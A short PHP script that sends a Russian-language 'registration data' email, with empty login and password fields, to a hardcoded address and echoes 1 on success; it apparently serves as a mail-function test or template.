<?php 

	$subject = "Регистрационные данные http://www." . $_SERVER['SERVER_NAME'];
	$message = 'Ваш логин: '. '<br>Ваш пароль: ';

	$headers  = "Content-type: text/html; charset=windows-1251 \r\n";
	$headers .= "From: <noreply@".$_SERVER['SERVER_NAME'].".ru>\r\n";

	if (mail('andrey.schmitz@gmail.com', $subject, $message, $headers))
		echo 1;

?>